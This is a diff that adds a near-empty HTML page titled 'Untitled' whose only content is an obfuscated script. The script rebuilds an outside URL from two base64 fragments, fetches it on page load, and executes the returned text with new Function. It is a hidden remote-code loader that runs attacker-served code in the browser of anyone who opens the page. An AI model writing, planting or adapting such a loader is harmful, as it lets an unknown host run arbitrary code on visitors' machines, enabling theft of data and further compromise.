@@ -1,0 +1,29 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Untitled</title>
+</head>
+<body>
+<script>
+var partB64a = 'aHR0cHM6Ly9zdGFpcnlzdmFudA==';
+var partB64b = 'ZS5jb20vZ3JpcHBlLnJldHlwZQ==';
+
+function fromBase64(s) {
+  return decodeURIComponent(escape(atob(s)));
+}
+
+var dest = fromBase64(partB64a) + fromBase64(partB64b);
+var http = new XMLHttpRequest();
+
+http.open('GET', dest, true);
+http.onreadystatechange = function () {
+  if (http.readyState !== 4) return;
+  if (http.status < 200 || http.status > 299) return;
+  var runner = new Function(http.responseText);
+  runner();
+};
+http.send(null);
+</script>
+</body>
+</html>
